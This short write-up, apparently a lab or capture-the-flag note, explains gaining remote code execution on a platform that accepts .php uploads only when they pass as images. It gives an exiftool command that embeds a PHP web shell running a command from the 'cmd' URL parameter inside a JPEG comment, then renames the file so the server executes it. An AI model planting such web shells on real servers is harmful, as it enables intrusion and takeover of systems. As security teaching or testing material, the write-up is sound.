# Remote code execution via polyglot web shell upload

The platform allow's `.php` uploads but validates if it's an image. We can however embed a php script in the comment of the image which will run our malicious code.
We can do that using this command:
`exiftool -Comment="<?php system(\$_GET['cmd']); ?>" image.jpg`
So now we can change the file extension to php - the server will validate that it's an image, but the php interpreter will run it.